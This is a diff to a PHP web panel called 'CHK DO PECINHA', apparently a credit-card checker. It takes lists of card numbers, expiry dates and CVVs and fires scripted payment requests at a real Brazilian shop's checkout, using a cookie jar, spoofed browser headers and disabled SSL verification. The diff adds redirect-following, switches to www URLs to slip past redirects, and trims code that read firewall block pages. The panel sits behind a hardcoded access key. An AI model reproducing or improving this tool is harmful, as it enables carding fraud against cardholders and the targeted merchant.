@@ -1,15 +1,13 @@
 <?php
 // =====================================================
-// ✅ CHK DO PECINHA - COM COOKIE JAR E DEBUG DE WAF NA TELA
+// ✅ CHK DO PECINHA - COM FOLLOW LOCATION ATIVADO
 // =====================================================
 
 session_start();
 
-// Chave de acesso única do sistema
 $chave_valida = "A4B9X2M7K1P8"; 
 $erro = "";
 
-// 1. Processar Login por Chave
 if (isset($_POST['f_login'])) {
     $chave_digitada = trim($_POST['chave'] ?? '');
     
@@ -22,14 +20,12 @@ if (isset($_POST['f_login'])) {
     }
 }
 
-// 2. Processar Logout
 if (isset($_GET['action']) && $_GET['action'] === 'logout') {
     session_destroy();
     header("Location: index.php");
     exit;
 }
 
-// 3. Processar Requisição do Checker (Gateway Real Integrado com Cookies & Headers)
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
     if (!isset($_SESSION['logado'])) {
         echo json_encode(['status' => 'error', 'html' => "<span class='text-zinc-500'>[ERRO] Sessão expirada. Faça login novamente.</span>"]);
@@ -50,12 +46,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
     $cc_cvv = trim($dados_cc[3]);
 
     $cookie_file = __DIR__ . '/cookie.txt';
-    $url_checkout = "https://franadesivos.com.br/checkout";
-    $url_pay = "https://franadesivos.com.br/checkout/pay";
+    // Colocamos www. nas URLs para evitar o redirecionamento logo de início
+    $url_checkout = "https://www.franadesivos.com.br/checkout";
+    $url_pay = "https://www.franadesivos.com.br/checkout/pay";
 
-    // ETAPA A: Acessa a página de checkout primeiro para gerar os cookies de sessão
+    // ETAPA A: Acessa a página de checkout primeiro
     $ch_init = curl_init($url_checkout);
     curl_setopt($ch_init, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch_init, CURLOPT_FOLLOWLOCATION, true); // <-- SEGUIR REDIRECIONAMENTOS (NOVO)
     curl_setopt($ch_init, CURLOPT_COOKIEJAR, $cookie_file);
     curl_setopt($ch_init, CURLOPT_COOKIEFILE, $cookie_file);
     curl_setopt($ch_init, CURLOPT_SSL_VERIFYPEER, false);
@@ -64,7 +62,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
     curl_exec($ch_init);
     curl_close($ch_init);
 
-    // ETAPA B: Dispara o POST de pagamento usando os cookies coletados
+    // ETAPA B: Dispara o POST de pagamento
     $dados_envio = [
         'default'         => '277958',
         'shipping-method' => 'mandae_economico',
@@ -81,6 +79,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
 
     $ch = curl_init($url_pay);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // <-- SEGUIR REDIRECIONAMENTOS (NOVO)
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($dados_envio));
     curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
@@ -90,8 +89,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
     curl_setopt($ch, CURLOPT_HTTPHEADER, [
         'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
         'X-Requested-With: XMLHttpRequest',
-        'Origin: https://franadesivos.com.br',
-        'Referer: https://franadesivos.com.br/checkout',
+        'Origin: https://www.franadesivos.com.br',
+        'Referer: https://www.franadesivos.com.br/checkout',
         'Accept: application/json, text/javascript, */*; q=0.01',
         'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
         'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
@@ -111,15 +110,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
             $retorno_msg = $resposta_json['message'] ?? $resposta_json['error'] ?? 'Retorno sem mensagem';
         } else {
             $status_site = 'failed';
-            
-            // Tenta capturar a tag <title> do HTML de bloqueio (ex: "Just a moment...", "403 Forbidden")
             preg_match('/<title>(.*?)<\/title>/is', $resposta_bruta, $matches);
             $titulo_erro = $matches[1] ?? 'Sem título';
-            
-            // Pega os primeiros 60 caracteres do texto puro da página para identificar o firewall
             $texto_limpo = preg_replace('/\s+/', ' ', strip_tags($resposta_bruta));
             $resumo_erro = substr(trim($texto_limpo), 0, 60);
-            
             $retorno_msg = "WAF: [{$titulo_erro}] - {$resumo_erro}...";
         }
     }
@@ -169,13 +163,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
 <body class="bg-black text-zinc-100 min-h-screen flex items-center justify-center p-4 selection:bg-zinc-700 selection:text-white">
 
     <?php if (!isset($_SESSION['logado'])): ?>
-        <!-- TELA DE LOGIN POR CHAVE -->
         <div class="w-full max-w-md bg-zinc-900 p-8 rounded-2xl shadow-2xl border border-zinc-800 text-center card-glow">
-            
             <div class="mb-6 flex justify-center">
                 <img src="logo.png" alt="Logotipo Pecinha" class="h-28 w-28 object-cover rounded-full border-2 border-zinc-700 shadow-xl p-1 bg-black" onerror="this.style.display='none'">
             </div>
-
             <h1 class="text-2xl font-bold mb-1 tracking-wider text-white">CHK DO PECINHA</h1>
             <p class="text-xs text-zinc-400 mb-6 font-mono uppercase tracking-widest">Autenticação Segura</p>
             
@@ -196,9 +187,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
                 </button>
             </form>
         </div>
-
     <?php else: ?>
-        <!-- PAINEL PRINCIPAL -->
         <div id="mainPanel" class="w-full max-w-2xl bg-zinc-900 p-6 sm:p-8 rounded-2xl shadow-2xl border border-zinc-800 card-glow transition-all duration-300">
             <div class="flex justify-between items-center mb-6 border-b border-zinc-800 pb-4">
                 <div class="flex items-center gap-3">
